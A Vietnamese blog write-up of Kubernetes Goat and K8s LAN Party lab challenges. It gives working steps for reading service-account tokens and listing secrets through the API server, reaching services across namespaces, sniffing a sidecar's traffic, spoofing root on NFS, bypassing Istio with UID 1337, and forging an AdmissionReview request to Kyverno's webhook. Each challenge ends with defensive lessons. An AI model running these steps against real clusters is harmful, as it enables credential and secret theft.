---
title: "Thực hành và nghiên cứu các kĩ thuật tấn công Kubernetes"
date: 2026-05-24 00:00:00 +0700
categories: ["Security-Research"]
tags: ["Kubernetes", "Security"]
---


# Buổi 1 : Học trên KubernetesGoat

## Dựng cluster bằng Kind

```
curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.31.0/kind-linux-amd64
chmod +x ./kind
sudo mv ./kind /usr/local/bin/kind
kind version
```


Cài kubectl
```
sudo apt install -y kubernetes-client
kubectl version --client
```


Tạo cluster

```
kind create cluster --name goat
kubectl get nodes
```


![](/assets/images/posts/Pasted%20image%2020260520151056.png)


![](/assets/images/posts/Pasted%20image%2020260520151147.png)


```
git clone https://github.com/madhuakula/kubernetes-goat.git
cd kubernetes-goat
chmod +x setup-kubernetes-goat.sh access-kubernetes-goat.sh
bash setup-kubernetes-goat.sh
kubectl get pods
bash access-kubernetes-goat.sh
```


![](/assets/images/posts/Pasted%20image%2020260520151812.png)


## Bài 1 : Gaining enviroment information

Bài đầu tiên là enum để tìm ra các cred của hệ thống

 Hầu hết các phiên bản điện toán khi chạy ứng dụng đều lưu trữ thông tin nhạy cảm như secrets, api_keys, v.v. trong các biến môi trường. Tương tự, trong Kubernetes, hầu hết mọi người lưu trữ thông tin nhạy cảm như Kubernetes Secrets và các giá trị Config trong các biến môi trường và nếu kẻ tấn công có thể tìm thấy các lỗ hổng ứng dụng như RCE (thực thi mã từ xa) hoặc chèn lệnh thì bí mật đó sẽ bị lộ.


![](/assets/images/posts/Pasted%20image%2020260520152145.png)



Trước tiên thì t enum bằng các lệnh cơ bản

![](/assets/images/posts/Pasted%20image%2020260520152345.png)


```
oot@system-monitor-deployment-866f697c75-67qj4:/# env
KUBERNETES_SERVICE_PORT_HTTPS=443
SYSTEM_MONITOR_SERVICE_SERVICE_PORT=8080
BUILD_CODE_SERVICE_PORT_3000_TCP_PROTO=tcp
KUBERNETES_GOAT_HOME_SERVICE_SERVICE_PORT=80
KUBERNETES_SERVICE_PORT=443
KUBERNETES_GOAT_HOME_SERVICE_PORT_80_TCP_PORT=80
HOSTNAME=system-monitor-deployment-866f697c75-67qj4
BUILD_CODE_SERVICE_PORT=tcp://10.96.99.17:3000
SYSTEM_MONITOR_SERVICE_PORT_8080_TCP_ADDR=10.96.59.36
SYSTEM_MONITOR_SERVICE_PORT_8080_TCP=tcp://10.96.59.36:8080
INTERNAL_PROXY_INFO_APP_SERVICE_PORT_5000_TCP=tcp://10.96.78.20:5000
INTERNAL_PROXY_API_SERVICE_PORT_3000_TCP_PROTO=tcp
HEALTH_CHECK_SERVICE_PORT_80_TCP=tcp://10.96.17.194:80
BUILD_CODE_SERVICE_PORT_3000_TCP_PORT=3000
INTERNAL_PROXY_INFO_APP_SERVICE_PORT=tcp://10.96.78.20:5000
POOR_REGISTRY_SERVICE_PORT_5000_TCP_ADDR=10.96.58.92
HEALTH_CHECK_SERVICE_PORT_80_TCP_ADDR=10.96.17.194
INTERNAL_PROXY_API_SERVICE_PORT=tcp://10.96.185.85:3000
PWD=/
K8S_GOAT_VAULT_KEY=k8s-goat-cd2da27224591da2b48ef83826a8a6c3
INTERNAL_PROXY_INFO_APP_SERVICE_PORT_5000_TCP_ADDR=10.96.78.20
HEALTH_CHECK_SERVICE_PORT=tcp://10.96.17.194:80
KUBERNETES_GOAT_HOME_SERVICE_PORT_80_TCP=tcp://10.96.139.85:80
KUBERNETES_GOAT_HOME_SERVICE_PORT_80_TCP_PROTO=tcp
SYSTEM_MONITOR_SERVICE_PORT_8080_TCP_PORT=8080
POOR_REGISTRY_SERVICE_SERVICE_PORT=5000
SYSTEM_MONITOR_SERVICE_PORT_8080_TCP_PROTO=tcp
POOR_REGISTRY_SERVICE_PORT_5000_TCP_PROTO=tcp
HOME=/root
BUILD_CODE_SERVICE_SERVICE_PORT=3000
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
LS_COLORS=
POOR_REGISTRY_SERVICE_PORT_5000_TCP_PORT=5000
INTERNAL_PROXY_INFO_APP_SERVICE_SERVICE_PORT=5000
HEALTH_CHECK_SERVICE_PORT_80_TCP_PROTO=tcp
INTERNAL_PROXY_INFO_APP_SERVICE_SERVICE_HOST=10.96.78.20
HEALTH_CHECK_SERVICE_SERVICE_HOST=10.96.17.194
INTERNAL_PROXY_INFO_APP_SERVICE_PORT_5000_TCP_PORT=5000
INTERNAL_PROXY_INFO_APP_SERVICE_PORT_5000_TCP_PROTO=tcp
INTERNAL_PROXY_API_SERVICE_PORT_3000_TCP_PORT=3000
BUILD_CODE_SERVICE_PORT_3000_TCP_ADDR=10.96.99.17
INTERNAL_PROXY_API_SERVICE_PORT_3000_TCP_ADDR=10.96.185.85
SYSTEM_MONITOR_SERVICE_PORT=tcp://10.96.59.36:8080
SHLVL=1
BUILD_CODE_SERVICE_SERVICE_HOST=10.96.99.17
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
HEALTH_CHECK_SERVICE_PORT_80_TCP_PORT=80
INTERNAL_PROXY_API_SERVICE_SERVICE_PORT=3000
SYSTEM_MONITOR_SERVICE_SERVICE_HOST=10.96.59.36
INTERNAL_PROXY_API_SERVICE_PORT_3000_TCP=tcp://10.96.185.85:3000
KUBERNETES_GOAT_HOME_SERVICE_SERVICE_HOST=10.96.139.85
KUBERNETES_SERVICE_HOST=10.96.0.1
INTERNAL_PROXY_API_SERVICE_SERVICE_HOST=10.96.185.85
KUBERNETES_GOAT_HOME_SERVICE_PORT=tcp://10.96.139.85:80
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
BUILD_CODE_SERVICE_PORT_3000_TCP=tcp://10.96.99.17:3000
HEALTH_CHECK_SERVICE_SERVICE_PORT=80
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
KUBERNETES_GOAT_HOME_SERVICE_PORT_80_TCP_ADDR=10.96.139.85
POOR_REGISTRY_SERVICE_SERVICE_HOST=10.96.58.92
POOR_REGISTRY_SERVICE_PORT_5000_TCP=tcp://10.96.58.92:5000
POOR_REGISTRY_SERVICE_PORT=tcp://10.96.58.92:5000
_=/usr/bin/env
```


- Mình đang là root **trong container**, chưa có nghĩa là root của node.
- Pod hiện tại: system-monitor-deployment-866f697c75-67qj4.
- Kubernetes API server: 10.96.0.1:443 hoặc DNS kubernetes.default.svc.
- Có nhiều service nội bộ: build-code, internal-proxy, poor-registry, health-check.
- Có một secret lộ ngay trong env:
    
    `K8S_GOAT_VAULT_KEY=k8s-goat-cd2da27224591da2b48ef83826a8a6c3`

![](/assets/images/posts/Pasted%20image%2020260520152824.png)

Đây có vẻ là flag của bài
- Có thư mục đáng nghi:
    
    `/host-system`
![](/assets/images/posts/Pasted%20image%2020260520153006.png)


Pod này có service account token được mount có namespace là default 

-> Từ trong container này , ta có thể dùng identity của SA được gắn cho pod này. 


Chúng ta có thể khám phá container bằng cách chạy các lệnh khác nhau để có thể enum để có thể hiểu hơn về hệ thống 

Chúng ta có thể get the container runtime bằng cách chạy những lệnh sau

```
cat /proc/self/cgroup
```

![](/assets/images/posts/Pasted%20image%2020260520154719.png)


Get the information of the container host

```
cat /etc/hosts/
```


Get the mount information

``` 
mount
```


 Access the environment variables, including Kubernetes secrets mounted and service names, ports, etc

```
printenv
```


Chúng ta qua bài tiếp theo là 

### K8s namespace bypass

![](/assets/images/posts/Pasted%20image%2020260520160125.png)

Đây là một quan niệm sai lầm lớn trong thế giới Kubernetes. Hầu hết mọi người cho rằng khi có các namespace khác nhau trong Kubernetes và các tài nguyên được triển khai và quản lý, chúng sẽ an toàn và không thể truy cập lẫn nhau

Theo mặc định K8S sử dụng lược đồ mạng phẳng , có nghĩa là các pod/service trong 1 cluster có thể nói chuyện với nhau. Mà namespace ở trong cluster không có sự hạn chế bảo mật mạng theo mặt định. Anyone ở trong namespace đều có thể nói chuyện với namespacce khác . Trong trường hợp sau đây thì chúng ta có thể bypass namespace để có thể truy cập tài nguyen của namespace khác


![](/assets/images/posts/Pasted%20image%2020260520164929.png)



![](/assets/images/posts/Pasted%20image%2020260520165306.png)


truy cập vào bài lab 

![](/assets/images/posts/Pasted%20image%2020260520165313.png)

Đầu tiên chúng ta cần phải hiểu về thông tin địa chỉ IP của cluster để có thể tiến hành recon quét các dãy mạng của cluster

Một số lệnh cơ bản để có thể xem là : ip route , ifconfig , printenv,...

![](/assets/images/posts/Pasted%20image%2020260520165627.png)

![](/assets/images/posts/Pasted%20image%2020260520170058.png)


Pod IP: 10.244.0.15
Pod CIDR route: 10.244.0.0/24
Kubernetes DNS: 10.96.0.10
Service network thấy qua env: 10.96.x.x
DNS search: default.svc.cluster.local svc.cluster.local cluster.local

![](/assets/images/posts/Pasted%20image%2020260520171048.png)


RBAC đã chặn ko cho t đọc service rồi

 Vì bài gợi ý “Kubernetes-Goat loves cache”, ta nghi có cache service. Cache thường là Redis hoặc Memcached. Redis dùng port 6379.

zmap mặc định **blacklist private ranges**, trong đó có 10.0.0.0/8, nên nó tự chặn không cho scan. Vì vậy bạn bỏ đoạn đó và scan redis port để tìm được dãy mạng của redis
![](/assets/images/posts/Pasted%20image%2020260520175958.png)

![](/assets/images/posts/Pasted%20image%2020260520180054.png)



5. Ngoài scan IP, Kubernetes còn hỗ trợ DNS service theo dạng:

`<service-name>.<namespace>.svc.cluster.local`

nên ta phân giải được tên miền chứng tỏ rằng  từ pod namespace default, bạn có thể resolve được service ở namespace secure-middleware. Giờ test port Redis:

![](/assets/images/posts/Pasted%20image%2020260520175226.png)

- Namespace default và secure-middleware khác nhau.
- Nhưng pod hacker-container vẫn truy cập được Redis service namespace khác.
- Lý do: Kubernetes mặc định flat network, namespace không tự tạo network isolation.
- Cách phòng thủ: dùng **NetworkPolicy**, auth cho Redis/cache, không tin “internal only”.



### RBAC least privileges misconfiguration

![](/assets/images/posts/Pasted%20image%2020260520182649.png)

Trong thực tế, chúng ta thường thấy các nhà phát triển và nhóm DevOps cấp quyền dựa trên tư  duy mặc định cho tất cả vì nghĩ rằng nó sẽ tiện lợi , tức là cấp quyền  nhiều hơn mức cần thiết. Điều này dẫn đến việc kẻ tấn công có được nhiều quyền kiểm soát và đặc quyền vượt ngoài phạm vị mà họ dự định.

Mục tiêu bài này là 
Dùng service account trong pod để gọi Kubernetes API
Lợi dụng RBAC quá rộng
Đọc secret k8svaultapikey
Lấy k8s_goat_flag

Trước khi vào bài thì tui muốn nói sơ về khái niệm về ServiceAccount cũng như RBAC 



**1. Xác định service account token**

![](/assets/images/posts/Pasted%20image%2020260520183200.png)


**2. Set biến để gọi API server**

export APISERVER=https://${KUBERNETES_SERVICE_HOST}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt

```
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api
```

![](/assets/images/posts/Pasted%20image%2020260520183500.png)

**3. Recon quyền bằng REST API**

List secret trong namespace hiện tại:

`curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" \ $APISERVER/api/v1/namespaces/$NAMESPACE/secrets`

![](/assets/images/posts/Pasted%20image%2020260520183859.png)


![](/assets/images/posts/Pasted%20image%2020260520183930.png)

Decode ra thì lấy được flag

![](/assets/images/posts/Pasted%20image%2020260520183947.png)

1. **Pod có Kubernetes identity riêng**  
    Pod thường được gắn một **ServiceAccount**. Token của ServiceAccount nằm trong:

`/var/run/secrets/kubernetes.io/serviceaccount/`

2. **Có shell trong pod là có thể gọi Kubernetes API**  
    Nếu attacker có RCE/shell trong container, họ có thể lấy token đó rồi gọi API server:

`https://${KUBERNETES_SERVICE_HOST}`

3. **RBAC quyết định pod được làm gì trong cluster**  
    Token không tự nguy hiểm nếu RBAC chặt. Nhưng nếu ServiceAccount được cấp quyền quá rộng, attacker có thể list/get tài nguyên nhạy cảm.
    
4. **Secret trong Kubernetes chỉ an toàn nếu quyền đọc được kiểm soát tốt**  
    Trong bài này, ServiceAccount đáng lẽ chỉ cần quyền với webhookapikey, nhưng lại đọc được cả vaultapikey.
    
5. **Least privilege rất quan trọng**  
    Đây là lỗi thực tế hay gặp: DevOps cấp quyền “cho tiện”, ví dụ get/list secrets, rồi một pod bị compromise có thể biến thành credential theft trong cluster.



##  Buổi 2 : K8s Lan Party

![](/assets/images/posts/Pasted%20image%2020260523150131.png)


![](/assets/images/posts/Pasted%20image%2020260523150204.png)

Đến với bài đầu tiên thì t sẽ làm 1 chall về Recon , thì như bạn nào đã từng làm các bài lab về leo thang thì việc đầu tiên để có thể leo thang được thì chúng ta cần phải recon hoặc enum để có thêm 1 vài attack surfaces , nó giúp ích cho chúng ta trong các bước nâng cao đặc quyền tiếp theo . 

Trong bài lab này , khi mà t đã compomise vào 1 Pod trong K8s , và bước tiếp theo là muốn khám phá thêm các internal service để có  thể mở rộng phạm vi leo thang.

Thông thường K8s , các service thường liên lạc với nhau qua DNS nội bộ. 

Hai loại thành phần chính của Kubernetes mà bạn sẽ quan tâm nhất khi muốn tấn công các ứng dụng khác có thể truy cập được trên mạng trong cụm là [pod](https://kubernetes.io/docs/concepts/workloads/pods/) và [service](https://kubernetes.io/docs/concepts/services-networking/service/) .

Pod là các nhóm gồm một hoặc nhiều container đang chạy, và đây là nơi các ứng dụng mạng nội bộ mà bạn muốn tấn công sẽ hoạt động. Mỗi Pod có địa chỉ IP internal cluster được liên kết với chúng, và có một hoặc nhiều cổng mạng được công khai mà bạn có thể sử dụng để giao tiếp với các ứng dụng mạng.

Các service là những cách thức thân thiện để hiển thị các ứng dụng đang chạy trên một hoặc nhiều pod. Chúng cũng có địa chỉ IP của cluster và một hoặc nhiều cổng được hiển thị, cũng như nhiều bản ghi DNS liên kết được cấu hình trong trình phân giải DNS của cụm. Việc truy cập ứng dụng bằng dịch vụ so với truy cập trực tiếp vào pod thường tương tự nhau, tuy nhiên các service  có thêm các tính năng khám phá có thể hữu ích cho chúng ta.

Địa chỉ IP được sử dụng cho các pod thường nằm trong một dải mạng riêng biệt, khác với địa chỉ IP của các dịch vụ.

Giờ chúng ta đã xác định được những gì mình cần tìm, hãy cùng xem xét một số phương pháp có thể sử dụng để xác định các thành phần này.


Đầu tiên chúng ta sẽ kiểm tra các biến môi trường , chúng thường chứa địa  chỉ  ip ,port của các  service khác trong cluster  . 


![](/assets/images/posts/Pasted%20image%2020260523152812.png)


Ngoài ra bạn có thể lấy địa chỉ IP của cụm là các tệp `/etc/hosts`(cung cấp địa chỉ IP cục bộ của pod, mà bạn cũng có thể lấy từ các lệnh `ip`hoặc `ifconfig`) và `/etc/resolv.conf`(cung cấp địa chỉ máy chủ DNS của cụm và các miền tìm kiếm DNS, từ đó suy ra namespace của pod).

Ngoài ra bạn cũng có thể lấy các SA token của pod hoặc ra tìm các namespace của pod đang chạy . https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#kubernetes-dns-to-the-partial-rescue


Tiếp tục với bài này thì chúng ta có thể sử dụng 1 cái tool dnscan https://gist.github.com/nirohfeld/c596898673ead369cb8992d97a1c764e để có thể quét 

![](/assets/images/posts/Pasted%20image%2020260523153737.png)

Khi chúng ta kiểm tra bằng env thì có thể thấy rằng  IP của API server của K8s là 10.100.0.1 port là 443 

![](/assets/images/posts/Pasted%20image%2020260523154220.png)

kết quả **Hostname:** `getflag-service.k8s-lan-party.svc.cluster.local.`

Cái tên **"getflag-service"** chính là nơi chứa Flag hoặc mã để vượt qua thử thách này.

![](/assets/images/posts/Pasted%20image%2020260523154415.png)




![](/assets/images/posts/Pasted%20image%2020260523154614.png)


Tới phần tiếp theo là phần finding neighbour 

 Thì theo như mình tìm hiểu sidecar container là một container chạy "kèm" theo container chính trong cùng một Pod.
- **Mục đích:** Nó không thực hiện logic chính của ứng dụng mà cung cấp các dịch vụ hỗ trợ như: ghi log, giám sát, hoặc **bảo mật**

Vì các container nằm trong cùng một **Kubernetes Pod** sẽ dùng chung một **network namespace**, chúng sẽ chia sẻ hoàn toàn giao diện mạng (network interfaces), loopback adapter (localhost) và địa chỉ IP với nhau.

Nếu có một container khác đang chạy ngầm ngay bên cạnh bạn trong Pod này, mọi dữ liệu mạng mà nó gửi hoặc nhận với các dịch vụ nội bộ đều có thể xem từ chính container của bạn.


```
tcpdump -A
```

![](/assets/images/posts/Pasted%20image%2020260523155633.png)

Và đây là flag

Hãy đảm bảo rằng giao tiếp giữa các Pod luôn được mã hóa. Cách đơn giản nhất để bắt đầu mã hóa giao tiếp giữa các Pod là sử dụng [service mesh](https://www.techtarget.com/searchitoperations/definition/service-mesh) .


![](/assets/images/posts/Pasted%20image%2020260523155755.png)


giao thức này ra đời từ thời kỳ mà kiểm soát truy cập (access control) chỉ dựa vào mạng ,nghĩa l à mình ko cần xác thực bằng thông tin  đăng nhập . Tui tham khảo trên mạng thì nghĩ ngay tới NFS , hoặc AWS EFS

![](/assets/images/posts/Pasted%20image%2020260523160134.png)


![](/assets/images/posts/Pasted%20image%2020260523160237.png)

Dùng công cụ NFS Client để "bypass" quyền

Trong môi trường này có sẵn công cụ `nfs-ls` và `nfs-cat` (thuộc bộ `libnfs`). Giao thức NFSv4 cho phép chúng ta truyền tham số `uid=0` (Root) và `gid=0` trực tiếp qua chuỗi kết nối để ép server nhận diện mình là Root

![](/assets/images/posts/Pasted%20image%2020260523160608.png)


![](/assets/images/posts/Pasted%20image%2020260523160648.png)


```
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: istio-get-flag
  namespace: k8s-lan-party
spec:
  action: DENY
  selector:
    matchLabels:
      app: "{flag-pod-name}"
  rules:
  - from:
    - source:
        namespaces: ["k8s-lan-party"]
    to:
    - operation:
        methods: ["POST", "GET"]
```

![](/assets/images/posts/Pasted%20image%2020260523160933.png)

![](/assets/images/posts/Pasted%20image%2020260523161000.png)

https://pulsesecurity.co.nz/advisories/istio-egress-bypass?source=post_page-----c773190e9246---------------------------------------

Phương pháp bỏ qua này cho phép bất kỳ người dùng nào có userID 1337 đều có thể bypass bộ lọc proxy của Istio, từ đó kích hoạt chính sách ủy quyền. May mắn thay, lần này chúng ta là người dùng root trong hệ thống, nghĩa là chúng ta có thể tạo một người dùng khác và đặt userID là 1337.


![](/assets/images/posts/Pasted%20image%2020260523161337.png)



![](/assets/images/posts/Pasted%20image%2020260523161517.png)


Đầu tiên chạy dns scan 

![](/assets/images/posts/Pasted%20image%2020260523161701.png)

Kyverno là công cụ quản lý chính sách (Policy Engine) dành riêng cho Kubernetes, giúp bạn xác thực, chỉnh sửa và khởi tạo tài nguyên bằng ngôn ngữ **YAML** quen thuộc. Thay vì học ngôn ngữ phức tạp, Kyverno cho phép đội ngũ DevOps tự động hóa việc bảo mật và chuẩn hóa cấu hình cluster một cách đơn giản, hiệu quả và cực kỳ gọn nhẹ.

Dựa trên chall chính sách này đang thực hiện tính năng **Mutation**: tự động chèn giá trị bí mật (secret) vào biến môi trường `FLAG` cho bất kỳ Pod nào được tạo trong namespac

```
apiVersion: kyverno.io/v1
kind: Policy
metadata:
  name: apply-flag-to-env
  namespace: sensitive-ns
spec:
  rules:
    - name: inject-env-vars
      match:
        resources:
          kinds:
            - Pod
      mutate:
        patchStrategicMerge:
          spec:
            containers:
              - name: "*"
                env:
                  - name: FLAG
                    value: "{flag}"
```


Vì tôi mình biết về admission controllers and mutating webhooks, nên mình ngay lập tức hiểu được kỳ vọng. Dưới đây là sơ đồ mô tả cách thức hoạt động.

![](/assets/images/posts/Pasted%20image%2020260523162159.png)

```
cat <<EOF > pod.json
{
  "kind": "AdmissionReview",
  "apiVersion": "admission.k8s.io/v1",
  "request": {
    "uid": "00000000-0000-0000-0000-000000000000",
    "kind": {
      "group": "",
      "version": "v1",
      "kind": "Pod"
    },
    "resource": {
      "group": "",
      "version": "v1",
      "resource": "pods"
    },
    "subResource": "",
    "requestKind": {
      "group": "",
      "version": "v1",
      "kind": "Pod"
    },
    "requestResource": {
      "group": "",
      "version": "v1",
      "resource": "pods"
    },
    "requestSubResource": "",
    "name": "sensitive-pod",
    "namespace": "sensitive-ns",
    "operation": "CREATE",
    "userInfo": {
      "username": "kubernetes-admin",
      "groups": [
        "system:masters",
        "system:authenticated"
      ]
    },
    "object": {
      "apiVersion": "v1",
      "kind": "Pod",
      "metadata": {
        "name": "sensitive-pod",
        "namespace": "sensitive-ns",
        "labels": {
          "app": "nginx"
        }
      },
      "spec": {
        "containers": [
          {
            "name": "nginx",
            "image": "nginx:latest"
          }
        ]
      }
    },
    "oldObject": null,
    "dryRun": false,
    "options": {
      "kind": "CreateOptions",
      "apiVersion": "meta.k8s.io/v1"
    }
  }
}
EOF
```


 Bước 2: Gửi request đến Kyverno Webhook

Bây giờ cấu trúc đã chuẩn hóa, bạn chạy lệnh `curl` này để ép Kyverno trả flag

```
curl -X POST -H "Content-Type: application/json" --data @pod.json https://kyverno-svc.kyverno/mutate -k
```

![](/assets/images/posts/Pasted%20image%2020260523162910.png)



![](/assets/images/posts/Pasted%20image%2020260523162740.png)


Trong cụm Kubernetes này, quản trị viên dùng **Kyverno** để tự động hóa một việc:

- Họ cài một chính sách (Policy) quy định: _"Bất kỳ ai tạo một Pod (vùng chứa ứng dụng) nằm trong namespace tên là `sensitive-ns`, Kyverno sẽ tự động chèn thêm một biến môi trường chứa Flag bí mật vào Pod đó"_.
    

Thông thường, người dùng muốn lấy Flag thì phải có quyền dùng lệnh `kubectl` để tạo một Pod thật trong namespace `sensitive-ns`, sau đó vào Pod đó để đọc biến môi trường. Nhưng ở đây, bạn **không có quyền** tạo Pod thật.


Kyverno hoạt động dựa trên cơ chế **Mutating Webhook** (một dịch vụ mạng chạy ngầm). Khi có yêu cầu tạo Pod, Kubernetes API Server sẽ gửi một gói tin dữ liệu cấu hình (dạng JSON) đến Webhook này của Kyverno để nó chỉnh sửa.

Cái sai nghiêm trọng của người quản trị ở đây là: **Họ mở  dịch vụ Webhook này (`https://kyverno-svc.kyverno/mutate`) cho tất cả các Pod nội bộ truy cập** mà không hề cấu hình tường lửa mạng (Network Policy) hay xác thực mTLS để chặn lại.


1. **Gửi cấu hình nháp:** Bạn dùng lệnh `curl` để gửi một file JSON cấu hình nháp (`pod.json`) giả vờ như đang muốn tạo một Pod trong namespace `sensitive-ns` thẳng tới cổng dịch vụ của Kyverno.
    
2. **Kyverno bị lừa:** Kyverno nhận được gói tin, không hề kiểm tra xem ai gửi, cứ thấy có yêu cầu tạo Pod ở `sensitive-ns` là nó tự động làm theo lập trình: **Chèn ngay đoạn mã chứa Flag vào cấu hình** rồi gửi trả ngược lại cho bạn.
    
3. **Lấy Flag:** Đoạn mã chứa Flag trả về được mã hóa dưới dạng Base64 để bảo toàn cấu trúc dữ liệu, bạn chỉ cần mang chuỗi đó đi giải mã (`base64 -d`) là nhìn thấy Flag lộ ra rõ mồm một.




